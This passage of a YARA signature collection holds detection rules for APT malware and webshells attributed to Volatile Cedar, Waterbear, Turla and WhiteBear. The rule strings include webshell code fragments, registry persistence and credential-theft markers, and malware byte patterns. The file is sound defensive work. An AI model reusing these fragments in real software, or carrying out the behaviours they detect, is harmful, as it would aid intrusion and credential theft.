($decode*)\n}\n\nrule USCERT_z_webshell\n{\n    meta:\n        description = \"z_webshell\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"DHS NCCIC Hunt and Incident Response Team\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"z_webshell\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $webshell_name = \"public string z_progname =\" nocase ascii wide\n        $webshell_password = \"public string Password =\" nocase ascii wide\n\n    condition:\n        (uint32(0) == 0x2040253c or uint32(0) == 0x7073613c) and filesize < 100KB and 2 of ($webshell_*)\n}\n\nrule USCERT_TA18_074A_screen\n{\n    meta:\n        description = \"Malware mentioned in TA18-074A\"\n        ref = \"https://www.us-cert.gov/ncas/alerts/TA18-074A\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"TA18_074A_screen\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"screen.exe\" fullword wide\n        $s2 = \"PlatformInvokeUSER32\" fullword ascii\n        $s3 = \"GetDesktopImageF\" fullword ascii\n        $s4 = \"PlatformInvokeGDI32\" fullword ascii\n        $s5 = \"Too many arguments, going to store in current dir\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 60KB and 3 of them\n}\n\nrule USCERT_TA18_074A_scripts\n{\n    meta:\n        description = \"Malware mentioned in TA18-074A\"\n        ref = \"https://www.us-cert.gov/ncas/alerts/TA18-074A\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"TA18_074A_scripts\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Running -s cmd /c query user on \" ascii\n\n    condition:\n        filesize < 600KB and 2 of them\n}\n\nrule VolatileCedar_Explosive_EXE : APT\n{\n    meta:\n        description = \"Explosion/Explosive Malware - Volatile Cedar APT\"\n        threat_names = \"Volatile Cedar\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Check Point Software Technologies Inc.\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Explosive_EXE\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $DLD_S = \"DLD-S:\"\n        $DLD_E = \"DLD-E:\"\n\n    condition:\n        all of them and uint16(0) == 0x5A4D\n}\n\nrule VolatileCedar_Explosion_Sample_1\n{\n    meta:\n        description = \"Explosion/Explosive Malware - Volatile Cedar APT\"\n        ref = \"http://goo.gl/5vYaNb\"\n        threat_names = \"Volatile Cedar\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Explosion_Sample_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s5 = \"REG ADD \\\"HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" ascii\n        $s9 = \"WinAutologon From Winlogon Reg\" fullword ascii\n        $s10 = \"82BD0E67-9FEA-4748-8672-D5EFE5B779B0\" fullword ascii\n        $s11 = \"IE:Password-Protected sites\" fullword ascii\n        $s12 = \"\\\\his.sys\" fullword ascii\n        $s13 = \"HTTP Password\" fullword ascii\n        $s14 = \"\\\\data.sys\" fullword ascii\n        $s15 = \"EL$_RasDefaultCredentials#0\" fullword wide\n        $s17 = \"Office Outlook HTTP\" fullword ascii\n        $s20 = \"Hist :<b> %ws</b>  :%s </br></br>\" fullword ascii\n\n    condition:\n        all of them and uint16(0) == 0x5A4D\n}\n\nrule VolatileCedar_Explosion_Sample_2\n{\n    meta:\n        description = \"Explosion/Explosive Malware - Volatile Cedar APT\"\n        ref = \"http://goo.gl/5vYaNb\"\n        threat_names = \"Volatile Cedar\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Explosion_Sample_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"serverhelp.dll\" fullword wide\n        $s1 = \"Windows Help DLL\" fullword wide\n        $s5 = \"SetWinHoK\" fullword ascii\n\n    condition:\n        all of them and uint16(0) == 0x5A4D\n}\n\nrule VolatileCedar_Explosion_Generic_1\n{\n    meta:\n        description = \"Explosion/Explosive Malware - Volatile Cedar APT\"\n        threat_names = \"Volatile Cedar\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Explosion_Generic_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"autorun.exe\" fullword\n        $s1 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; MSIE 6.0; Windows NT 5.1; .NET CL\"\n        $s2 = \"%drp.exe\" fullword\n        $s3 = \"%s_%s%d.exe\" fullword\n        $s4 = \"open=autorun.exe\" fullword\n        $s5 = \"http://www.microsoft.com/en-us/default.aspx\" fullword\n        $s10 = \"error.renamefile\" fullword\n        $s12 = \"insufficient lookahead\" fullword\n        $s13 = \"%s %s|\" fullword\n        $s16 = \":\\\\autorun.exe\" fullword\n\n    condition:\n        7 of them and uint16(0) == 0x5A4D\n}\n\nrule VolatileCedar_Explosive_UA\n{\n    meta:\n        description = \"Explosive Malware Embedded User Agent - Volatile Cedar APT\"\n        ref = \"http://goo.gl/HQRCdw\"\n        threat_names = \"Volatile Cedar\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Explosive_UA\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"Mozilla/4.0 (compatible; MSIE 7.0; MSIE 6.0; Windows NT 5.1; .NET CLR 2.0.50727)\" fullword\n\n    condition:\n        $x1 and uint16(0) == 0x5A4D\n}\n\nrule VolatileCedar_Webshell_Caterpillar_ASPX\n{\n    meta:\n        description = \"Volatile Cedar Webshell - from file caterpillar.aspx\"\n        ref = \"http://goo.gl/emons5\"\n        threat_names = \"Volatile Cedar\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Webshell_Caterpillar_ASPX\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Dim objNewRequest As WebRequest = HttpWebRequest.Create(sURL)\" fullword\n        $s1 = \"command = \\\"ipconfig /all\\\"\" fullword\n        $s3 = \"For Each xfile In mydir.GetFiles()\" fullword\n        $s6 = \"Dim oScriptNet = Server.CreateObject(\\\"WSCRIPT.NETWORK\\\")\" fullword\n        $s10 = \"recResult = adoConn.Execute(strQuery)\" fullword\n        $s12 = \"b = Request.QueryString(\\\"src\\\")\" fullword\n        $s13 = \"rw(\\\"<a href='\\\" + link + \\\"' target='\\\" + target + \\\"'>\\\" + title + \\\"</a>\\\")\" fullword\n\n    condition:\n        all of them\n}\n\nrule Waterbear_1_Jun17\n{\n    meta:\n        description = \"Malware from Operation Waterbear\"\n        ref = \"https://goo.gl/L9g9eR\"\n        threat_names = \"Operation Waterbear\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Waterbear_1_Jun17\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"\\\\Release\\\\svc.pdb\" ascii\n        $s2 = \"svc.dll\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 100KB and all of them)\n}\n\nrule Waterbear_2_Jun17\n{\n    meta:\n        description = \"Malware from Operation Waterbear\"\n        ref = \"https://goo.gl/L9g9eR\"\n        threat_names = \"Operation Waterbear\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Waterbear_2_Jun17\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"downloading movie\" fullword ascii\n        $s2 = \"name=\\\"test.exe\\\"/>\" fullword ascii\n        $s3 = \"<description>Test Application</description>\" fullword ascii\n        $s4 = \"UI look 2003\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 1000KB and all of them)\n}\n\nrule Waterbear_4_Jun17\n{\n    meta:\n        description = \"Malware from Operation Waterbear\"\n        ref = \"https://goo.gl/L9g9eR\"\n        threat_names = \"Operation Waterbear\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Waterbear_4_Jun17\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)\" fullword ascii\n        $s1 = \"Wininet.dll InternetOpenA InternetConnectA HttpOpenRequestA HttpSendRequestA HttpQueryInfoA InternetReadFile InternetCloseHandle\" fullword ascii\n        $s2 = \"read from pipe:%s\" fullword ascii\n        $s3 = \"delete pipe\" fullword ascii\n        $s4 = \"cmdcommand:%s\" fullword ascii\n        $s5 = \"%s /c del %s\" fullword ascii\n        $s6 = \"10.0.0.250\" fullword ascii\n        $s7 = \"Vista/2008\" fullword ascii\n        $s8 = \"%02X%02X%02X%02X%02X%02X%04X\" fullword ascii\n        $s9 = \"UNKOWN\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 300KB and 3 of them)\n}\n\nrule Waterbear_5_Jun17\n{\n    meta:\n        description = \"Malware from Operation Waterbear\"\n        ref = \"https://goo.gl/L9g9eR\"\n        threat_names = \"Operation Waterbear\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Waterbear_5_Jun17\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a1 = \"ICESWORD\" fullword ascii\n        $a2 = \"klog.dat\" fullword ascii\n        $s1 = \"\\\\cswbse.dll\" fullword ascii\n        $s2 = \"WIRESHARK\" fullword ascii\n        $s3 = \"default_zz|\" fullword ascii\n        $s4 = \"%c4%u-%.2u-%.2u %.2u:%.2u\" fullword ascii\n        $s5 = \"1111%c%s\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x3d53 and filesize < 100KB and (all of ($a*) or 3 of them))\n}\n\nrule Waterbear_6_Jun17\n{\n    meta:\n        description = \"Malware from Operation Waterbear\"\n        ref = \"https://goo.gl/L9g9eR\"\n        threat_names = \"Operation Waterbear\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Waterbear_6_Jun17\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"svcdll.dll\" fullword ascii\n        $s2 = \"log.log\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 60KB and all of them)\n}\n\nrule Waterbear_7_Jun17\n{\n    meta:\n        description = \"Malware from Operation Waterbear\"\n        ref = \"https://goo.gl/L9g9eR\"\n        threat_names = \"Operation Waterbear\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Waterbear_7_Jun17\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Bluthmon.exe\" fullword wide\n        $s2 = \"Motomon.exe\" fullword wide\n        $s3 = \"%d.%s%d%d%d\" fullword ascii\n        $s4 = \"mywishes.hlp\" fullword ascii\n        $s5 = \"filemon.rtf\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 80KB and all of them)\n}\n\nrule Waterbear_8_Jun17\n{\n    meta:\n        description = \"Malware from Operation Waterbear\"\n        ref = \"https://goo.gl/L9g9eR\"\n        threat_names = \"Operation Waterbear\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Waterbear_8_Jun17\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Update.dll\" fullword ascii\n        $s2 = \"ADVPACK32.DLL\" fullword wide\n        $s3 = \"\\\\Registry\\\\Machine\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\\" fullword ascii\n        $s4 = \"\\\\drivers\\\\sftst.sys\" fullword ascii\n        $s5 = \"\\\\\\\\.\\\\SFilter\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 40KB and all of them)\n}\n\nrule Waterbear_9_Jun17\n{\n    meta:\n        description = \"Malware from Operation Waterbear\"\n        ref = \"https://goo.gl/L9g9eR\"\n        threat_names = \"Operation Waterbear\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Waterbear_9_Jun17\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"ADVPACK32.DLL\" fullword wide\n        $s2 = \"ADVPACK32\" fullword wide\n        $a1 = \"U2_Dll.dll\" fullword ascii\n        $b1 = \"ProUpdate\" fullword ascii\n        $b2 = \"Update.dll\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 30KB and all of ($s*) and ($a1 or all of ($b*))\n}\n\nrule Waterbear_10_Jun17\n{\n    meta:\n        description = \"Malware from Operation Waterbear\"\n        ref = \"https://goo.gl/L9g9eR\"\n        threat_names = \"Operation Waterbear\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Waterbear_10_Jun17\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"ADVPACK32.DLL\" fullword wide\n        $s5 = \"ADVPACK32\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 30KB and all of them)\n}\n\nrule Waterbear_11_Jun17\n{\n    meta:\n        description = \"Malware from Operation Waterbear\"\n        ref = \"https://goo.gl/L9g9eR\"\n        threat_names = \"Operation Waterbear\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Waterbear_11_Jun17\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"/Pages/%u.asp\" fullword wide\n        $s2 = \"NVIDIA Corporation.\" fullword wide\n        $s3 = \"tqxbLc|fP_{eOY{eOX{eO\" fullword ascii\n        $s4 = \"Copyright (C) 2005\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 1000KB and all of them)\n}\n\nrule Waterbear_12_Jun17\n{\n    meta:\n        description = \"Malware from Operation Waterbear\"\n        ref = \"https://goo.gl/L9g9eR\"\n        threat_names = \"Operation Waterbear\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Waterbear_12_Jun17\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"O_PROXY\" fullword ascii\n        $s2 = \"XMODIFY\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 2000KB and all of them)\n}\n\nrule Waterbear_14_Jun17\n{\n    meta:\n        description = \"Malware from Operation Waterbear\"\n        ref = \"https://goo.gl/L9g9eR\"\n        threat_names = \"Operation Waterbear\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Waterbear_14_Jun17\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"my.com/msg/util/sgthash\" fullword ascii\n        $s2 = \"C:\\\\recycled\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 8000KB and all of them)\n}\n\nrule WaterBug_wipbot_2013_core_PDF\n{\n    meta:\n        description = \"Symantec Waterbug Attack - Trojan.Wipbot 2014 core PDF\"\n        ref = \"http://t.co/rF35OaAXrl\"\n        threat_names = \"Waterbug, Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Symantec Security Response\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"WaterBug_wipbot_2013_core_PDF\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $PDF = \"%PDF-\"\n        $a = /\\+[A-Za-z]{1}\\. _ _ \\$\\+[A-Za-z]{1}\\. _ \\$ _ \\+/\n        $b = /\\+[A-Za-z]{1}\\.\\$\\$\\$ _ \\+/\n\n    condition:\n        ($PDF at 0) and #a > 150 and #b > 200\n}\n\nrule WaterBug_wipbot_2013_dll\n{\n    meta:\n        description = \"Symantec Waterbug Attack - Trojan.Wipbot 2014 Down.dll component\"\n        ref = \"http://t.co/rF35OaAXrl\"\n        threat_names = \"Waterbug, Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Symantec Security Response\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"WaterBug_wipbot_2013_dll\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $string1 = \"/%s?rank=%s\"\n        $string2 = \"ModuleStart\\x00ModuleStop\\x00start\"\n        $string3 = \"1156fd22-3443-4344-c4ffff\"\n        $string4 = \"read\\x20file\\x2E\\x2E\\x2E\\x20error\\x00\\x00\"\n\n    condition:\n        2 of them\n}\n\nrule WaterBug_wipbot_2013_core\n{\n    meta:\n        description = \"Symantec Waterbug Attack - Trojan.Wipbot core + core; garbage appended data (PDF Exploit leftovers) + wipbot dropper; fake AdobeRd32 Error\"\n        ref = \"http://t.co/rF35OaAXrl\"\n        threat_names = \"Waterbug, Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Symantec Security Response\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"WaterBug_wipbot_2013_core\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $code1 = { 89 47 0C C7 47 10 90 C2 04 00 C7 47 14 90 C2 10 00 C7 47 18 90 90 60 68 89 4F 1C C7 47 20 90 90 90 B8 89 4F 24 C7 47 28 90 FF D0 61 C7 47 2C 90 C2 04 00}\n        $code2 = { 85 C0 75 25 8B 0B BF ?? ?? ?? ?? EB 17 69 D7 0D 66 19 00 8D BA 5F F3 6E 3C 89 FE C1 EE 10 89 F2 30 14 01 40 3B 43 04 72 E4}\n        $code3 = {90 90 90 ?? B9 00 4D 5A 90 00 03 00 00 00 82 04}\n        $code4 = {55 89 E5 5D C3 55 89 E5 83 EC 18 8B 45 08 85 C0}\n\n    condition:\n        uint16(0) == 0x5a4d and (($code1 or $code2) or ($code3 and $code4))\n}\n\nrule WaterBug_turla_dropper\n{\n    meta:\n        description = \"Symantec Waterbug Attack - Trojan Turla Dropper\"\n        ref = \"http://t.co/rF35OaAXrl\"\n        threat_names = \"Waterbug, Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Symantec Security Response\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"WaterBug_turla_dropper\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = {0F 31 14 31 20 31 3C 31 85 31 8C 31 A8 31 B1 31 D1 31 8B 32 91 32 B6 32 C4 32 6C 33 AC 33 10 34}\n        $b = {48 41 4C 2E 64 6C 6C 00 6E 74 64 6C 6C 00 00 00 57 8B F9 8B 0D ?? ?? ?? ?? ?? C9 75 26 56 0F 20 C6 8B C6 25 FF FF FE FF 0F 22 C0 E8}\n\n    condition:\n        all of them\n}\n\nrule WaterBug_fa_malware\n{\n    meta:\n        description = \"Symantec Waterbug Attack - FA malware variant\"\n        ref = \"http://t.co/rF35OaAXrl\"\n        threat_names = \"Waterbug, Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Symantec Security Response\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"WaterBug_fa_malware\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $string1 = \"C:\\\\proj\\\\drivers\\\\fa _ 2009\\\\objfre\\\\i386\\\\atmarpd.pdb\"\n        $string2 = \"d:\\\\proj\\\\cn\\\\fa64\\\\\"\n        $string3 = \"sengoku_Win32.sys\\x00\"\n        $string4 = \"rk_ntsystem.c\"\n        $string5 = \"\\\\uroboros\\\\\"\n        $string6 = \"shell.{F21EDC09-85D3-4eb9-915F-1AFA2FF28153}\"\n\n    condition:\n        uint16(0) == 0x5a4d and (any of ($string*))\n}\n\nrule WaterBug_sav\n{\n    meta:\n        description = \"Symantec Waterbug Attack - SAV Malware\"\n        ref = \"http://t.co/rF35OaAXrl\"\n        threat_names = \"Waterbug, Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Symantec Security Response\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"WaterBug_sav\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $code1a = { 8B 75 18 31 34 81 40 3B C2 72 F5 33 F6 39 7D 14 76 1B 8A 04 0E 88 04 0F 6A 0F 33 D2 8B C7 5B F7 F3 85 D2 75 01 }\n        $code1b = { 8B 45 F8 40 89 45 F8 8B 45 10 C1 E8 02 39 45 F8 73 17 8B 45 F8 8B 4D F4 8B 04 81 33 45 20 8B 4D F8 8B 55 F4 89 04 8A EB D7 83 65 F8 00 83 65 EC 00 EB 0E 8B 45 F8 40 89 45 F8 8B 45 EC 40 89 45 EC 8B 45 EC 3B 45 10 73 27 8B 45 F4 03 45 F8 8B 4D F4 03 4D EC 8A 09 88 08 8B 45 F8 33 D2 6A 0F 59 F7 F1 85 D2 75 07 }\n        $code1c = { 8A 04 0F 88 04 0E 6A 0F 33 D2 8B C6 5B F7 F3 85 D2 75 01 47 8B 45 14 46 47 3B F8 72 E3 EB 04 C6 04 08 00 48 3B C6 73 F7 33 C0 C1 EE 02 74 0B 8B 55 18 31 14 81 40 3B C6 72 F5 }\n        $code2 = { 29 5D 0C 8B D1 C1 EA 05 2B CA 8B 55 F4 2B C3 3D 00 00 00 01 89 0F 8B 4D 10 8D 94 91 00 03 00 00 73 17 8B 7D F8 8B 4D 0C 0F B6 3F C1 E1 08 0B CF C1 E0 08 FF 45 F8 89 4D 0C 8B 0A 8B F8 C1 EF 0B}\n\n    condition:\n        uint16(0) == 0x5a4d and (($code1a or $code1b or $code1c) and $code2)\n}\n\nrule WhiteBear_binary_loader_1\n{\n    meta:\n        description = \"WhiteBear loader\"\n        ref = \"https://securelist.com/introducing-whitebear/81638/\"\n        threat_names = \"WhiteBear, Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@fusionrace\"\n        source = \"https://github.com/airbnb/binaryalert\"\n        original_name = \"malware_windows_apt_whitebear_binary_loader_1\"\n        license = \"Apache-2.0 (https://opensource.org/licenses/Apache-2.0)\"\n\n    strings:\n        $a1 = \"### PE STORAGE ###\" wide ascii\n        $a2 = \"### CRYPTO 0 ###\" wide ascii\n        $a3 = \"### EXTERNAL STORAGE ###\" wide ascii\n        $a4 = \"### CRYPTO 1 ###\" wide ascii\n        $a5 = \"### QUEUES ###\" wide ascii\n        $a6 = \"### TRANSPORT ###\" wide ascii\n        $a7 = \"### EXECUTION SUBSYSTEM ###\" wide ascii\n        $a8 = \"### AUTORUN MANAGER ###\" wide ascii\n        $a9 = \"### INJECT MANAGER ###\" wide ascii\n        $a10 = \"### LOCAL TRANSPORT MANAGER ###\" wide ascii\n\n    condition:\n        6 of ($a*)\n}\n\nrule WhiteBear_binary_loader_2\n{\n    meta:\n        description = \"WhiteBear loader\"\n        ref = \"https://securelist.com/introducing-whitebear/81638/\"\n        threat_names = \"WhiteBear, Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@fusionrace\"\n        source = \"https://github.com/airbnb/binaryalert\"\n        original_name = \"malware_windows_apt_whitebear_binary_loader_2\"\n        license = \"Apache-2.0 (https://opensource.org/licenses/Apache-2.0)\"\n\n    strings:\n        $b1 = \"i cunt waiting anymore #%d\" wide ascii\n        $b2 = \"lights aint turnt off with #%d\" wide ascii\n        $b3 = \"Not find process\" wide ascii\n        $b4 = \"CMessageProcessingSystem::Receive_TAKE_NOP\" wide ascii\n        $b5 = \"CMessageProcessingSystem::Receive_TAKE_CAN_NOT_WORK\" wide ascii\n\n    condition:\n        3 of ($b*)\n}\n\nrule WhiteBear_binary_loader_3\n{\n    meta:\n        description = \"WhiteBear loader\"\n        ref = \"https://securelist.com/introducing-whitebear/81638/\"\n        threat_names = \"WhiteBear, Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@fusionrace\"\n        source = \"https://github.com/airbnb/binaryalert\"\n        original_name = \"malware_windows_apt_whitebear_binary_loader_3\"\n        license = \"Apache-2.0 (https://opensource.org/licenses/Apache-2.0)\"\n\n    strings:\n        $c1 = \"{531511FA-190D-5D85-8A4A-279F2F592CC7}\" wide ascii\n        $c2 = \"IsLoaderAlreadyWork\" wide ascii\n        $c3 = \"\\\\\\\\.\\\\pipe\\\\Winsock2\\\\CatalogChangeListener-%03x%01x-%01x\" wide ascii\n        $c4 = \"\\\\\\\\.\\\\pipe\\\\Winsock2\\\\CatalogChangeListener-%02x%02x-%01x\" wide ascii\n\n    condition:\n        all of ($c*)\n}\n\nrule WildNeutron_Sample_1\n{\n    meta:\n        description = \"Wild Neutron APT malware\"\n        ref = 